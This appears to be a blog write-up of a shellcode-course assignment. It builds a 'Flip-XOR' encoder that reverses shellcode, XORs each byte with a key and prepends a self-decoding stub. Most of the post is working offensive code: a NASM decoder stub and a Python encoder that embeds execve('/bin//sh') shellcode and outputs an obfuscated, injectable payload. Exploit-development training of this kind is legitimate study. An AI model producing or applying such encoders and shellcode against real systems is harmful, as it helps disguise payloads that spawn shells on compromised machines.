---
title:  Assignment 4
description: Create a Custom Encoder
order: 4
---

[&lt;&lt; Go Back]({{ site.baseurl }})


# {{ page.title }}
### {{ page.description }}
___
<div style="text-align:right;direction:ltr;margin-left:1em;"><h6>{{ page.date }}</h6></div>

For this challenge we will be creating a custom shellcode encoder, specifically what I am calling a 'Flip-XOR' encoder.  This encoder will reverse the order of the shellcode, XOR each byte with a key, then prepend a decoder stub.  Let's get started!

The first challenge is decoding such a shellcode.  The following assembly file shows how we could accomplish this:

```nasm
; decoder.nasm
;  - Decode shellcode, then pass over execution

global _start

section .text
_start:

        jmp short call_decoder

decoder:
        pop esi                 ; Shellcode location
        xor ecx, ecx            ; Length of shellcode
        mov cl, 7               ; ...
        mov edi, esi            ; Decode location
        add edi, ecx            ; ...
        add edi, ecx            ; ...
        dec edi                 ; ...

decode:
        xor ebx, ebx            ; Clear carry register
        mov bl, byte [esi]      ; Decode
        xor bl, 0xAA            ; ...
        mov byte [edi], bl      ; Move
        mov byte [esi], 0x90    ; Replace with nop
        inc esi                 ; Loop
        dec edi                 ; ...
        loop decode             ; ...
        jmp short Shellcode     ; Pass over execution


call_decoder:
        call decoder
        Shellcode: db 0x2a, 0x67, 0xea, 0x69, 0x23, 0x6a, 0x9b
```

As you can see, we start with a *jmp call pop* method of retrieving the address of our shellcode, then we set up our decode function with that address and the length of the shellcode.  In addition to storing the shellcode address, we also store an address to the *end* of a duplicate range *after* the shellcode, where we'll store our decoded shellcode.

The decode function takes the byte at *esi*, XORs it with the key (0xAA), moves the result to *edi*, then replaces *esi* with a NOP (0x90).  The function then loops after incrementing *esi* and decrementing *edi*.  In graphical form, we transformed this...

```
                 ESI                                           EDI
|--decoder-stub--|---encoded-shellcode---|-----------?-----------|
EIP
```
... into this ...
```
                                      ESI EDI
|--decoder-stub--|-------nop-sled--------|---decoded-shellcode---|
                 EIP
```

Great!  The next step is to build the actual encoder, shown below:

```python
#!/usr/bin/python
# encoder.py
#  - Encode shellcode using 'Flip-XOR', then prepend decoder

import sys

if (len(sys.argv) != 1):
        print "[-] No inputs! Configure shellcode manually."
        sys.exit()

shellcode = (           # execve(/bin//sh)
"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62"
"\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3"
"\x50\x89\xe2\x53\x89\xe1\x31\xc0\xb0\x0b"
"\xcd\x80"
)

key = 0xaa

length = len(shellcode)
print "Original Length: %d" % length

output = ""

# _start:
output += "\\xeb\\x1e"                  # jmp short call_decoder

# decoder:
output += "\\x5e"                       # pop esi
output += "\\x31\\xc9"                  # xor ecx, ecx
output += "\\xb1\\x%02x" % length       # mov cl, <length>
output += "\\x89\\xf7"                  # mov edi, esi
output += "\\x01\\xcf"                  # add edi, ecx
output += "\\x01\\xcf"                  # add edi, ecx
output += "\\x4f"                       # dec edi

# decode:
output += "\\x31\\xdb"                  # xor ebx, ebx
output += "\\x8a\\x1e"                  # mov bl, byte [esi]
output += "\\x80\\xf3\\x%02x" % key     # xor bl, <key>
output += "\\x88\\x1f"                  # mov byte [edi], bl
output += "\\xc6\\x06\\x90"             # mov byte [esi], 0x90
output += "\\x46"                       # inc esi
output += "\\x4f"                       # dec edi
output += "\\xe2\\xf0"                  # loop decode
output += "\\xeb\\x05"                  # jmp short Shellcode

# call_decoder:
output += "\\xe8\\xdd\\xff\\xff\\xff"   # call decoder

# Shellcode:
arr = bytearray(shellcode)
for i in range(0, length):
        # 'Flip-XOR' Encoding
        x = arr[length-1-i]
        y = x^key
        output += "\\x%02x" % y

newlength = len(output) / 4
print "Encoded Length: %d" % newlength
print "\"%s\"" % output
```

As you can see, our encoder not only encodes the provided *shellcode* with the provided *key*, it also prepends a decoder stub with the appropriate *length* and *key*.

A note on this encoder worth mentioning is that it **expands**, making use of the space after it.  This may or may not be a concern, depending on the application, but an improvement to this encoder might be eliminating the need to expand and just rearrange in-place.

You can find the all the code to this challenge at [https://github.com/johneiser/SLAE/tree/master/assignments/Assignment_4](https://github.com/johneiser/SLAE/tree/master/assignments/Assignment_4).

<br>
{% include preamble.md %}

[&lt;&lt; Go Back]({{ site.baseurl }})
